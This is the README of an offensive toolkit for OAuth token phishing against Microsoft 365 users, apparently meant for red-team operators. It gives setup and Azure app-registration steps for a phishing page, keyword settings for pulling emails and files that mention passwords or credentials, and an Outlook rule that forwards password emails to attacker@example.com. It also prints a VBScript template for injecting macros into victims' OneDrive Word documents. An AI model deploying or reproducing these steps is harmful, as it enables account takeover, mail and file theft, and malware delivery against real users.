## What is o365-attack-toolkit

o365-attack-toolkit allows operators to perform an OAuth phishing attack and later on use the Microsoft Graph API to extract interesting information.

Some of the  implemented features are :
* Extraction of keyworded e-mails from Outlook.
* Creation of Outlook Rules.
* Extraction of files from OneDrive/Sharepoint.
* Injection of macros on Word documents.


## Architecture

![](/images/Architecture.png)


### The toolkit consists of several components
### Phishing endpoint
The phishing endpoint is responsible for serving the HTML file that performs the OAuth token phishing.
### Backend services
Afterward, the token will be used by the backend services to perform the defined attacks.
### Management interface
The management interface can be utilized to inspect the extracted information from the Microsoft Graph API.

## Features

### Outlook Keyworded Extraction
User emails can be extracted by this toolkit using keywords.
For every defined keyword in the configuration file, all the emails that match them will be downloaded and saved in the database. The operator can inspect the downloaded emails through the management interface.
### Onedrive/Sharepoint Keyworded Extraction
Microsoft Graph API can be used to access files across OneDrive, OneDrive for Business and SharePoint document libraries.
User files can be extracted by this toolkit using keywords.
For every defined keyword in the configuration file, all the documents that match them will be downloaded and saved locally. The operator can examine the documents using the management interface.

### Outlook Rules Creation
Microsoft Graph API supports the creation of Outlook rules. 
You can define different rules by putting the rule JSON files in the rules/ folder.
https://docs.microsoft.com/en-us/graph/api/mailfolder-post-messagerules?view=graph-rest-1.0&tabs=cs

Below is an example rule that when loaded, it will forward every email that contains password in the body to ```attacker@example.com```.
```json
{      
    "displayName": "Example Rule",      
    "sequence": 2,      
    "isEnabled": true,          
    "conditions": {
        "bodyContains": [
          "password"       
        ]
     },
     "actions": {
        "forwardTo": [
          {
             "emailAddress": {
                "name": "Attacker Email",
                "address": "attacker@example.com"
              }
           }
        ],
        "stopProcessingRules": false
     }    
}
```

### Word Document Macro Backdooring
Users documents hosted on OneDrive can be backdoored by injecting macros. If this feature is enabled, the last 15 documents accessed by the user will be downloaded and backdoored with the macro defined in the configuration file. After the backdoored file has been uploaded, the extension of the document will be changed to .doc in order for the macro to be supported on Word.
It should be noted that after backdooring the documents, they can not be edited online which increases the chances of our payload execution.

This functionality can only be used on Windows because the insertion of macros is done using the Word COM object.
A VBS file is built by the template below and executed so don't panic if you see ``wscript.exe`` running.

```vbscript
	Dim wdApp
	Set wdApp = CreateObject("Word.Application")
	wdApp.Documents.Open("{DOCUMENT}")
	wdApp.Documents(1).VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "{MACRO}"
	wdApp.Documents(1).SaveAs2 "{OUTPUT}", 0
	wdApp.Quit
```

## How to set up

### Compile

```
cd %GOPATH%
git clone https://github.com/mdsecactivebreach/o365-attack-toolkit
cd o365-attack-toolkit
dep ensure
go build
```

### Configuration

An example configuration as below :
```
[server]
host = 127.0.0.1 ; The ip address for the external listener.
externalport = 30662 ; Port for the external listener
certificate = server.crt ; Certificate for the external listener
key = server.key ; Key for the external listener
internalport = 8080 ; Port for the internal listener.

; Keywords used for extracting emails and files of a user.
[keywords]
outlook = pass,vpn,creds,credentials
onedrive = password,.config,.xml,db,database,mbd 

[backdoor]
enabled = true ; Enable/Disable this feature
macro = "C:\\Test.bas" ; The location of the macro file to use for backdooring documents
```

### Deployment
Before start using this toolkit you need to create an Application on the Azure Portal.
Go to Azure Active Directory -> App Registrations -> Register an application.

![](/images/registerapp.png)

After creating the application, copy the Application ID and change it on ```static/index.html```.

The URL(external listener) that will be used for phishing should be added as a Redirect URL.
To add a redirect url, go the application and click Add a Redirect URL.

![](/images/redirecturl.png)

The Redirect URL should be the URL that will be used to host the phishing endpoint, in this case ```https://myphishingurl.com/```

![](/images/url.png)

Make sure to check both the boxes as shown below :

![](/images/implicitgrant.png)

It should be noted that you can run this tool on any Operating Systems that Go supports, but the Macro Backdooring Functionality will only work on Windows.

The look of the phishing page can be changed on ```static/index.html```.

##  Security Considerations

Apart from all the features this tool has, it also opens some attack surface on the host running the tool.
Firstly, the Macro Backdooring Functionality will open the word files, and if you are running an unpatched version 
of Office, bad things can happen. Additionally, the extraction of files can download malicious files which will be saved on your computer. 

The best approach would be isolating the  host properly and only allowing communication with the HTTPS redirector and Microsoft Graph API.


## Management Interface

The management interface allows the operator to browse the data that  has been extracted. 

#### Users view

![](/images/users.png)

#### View User Emails

![](/images/emails.png)


#### View Email

![](/images/email.png)

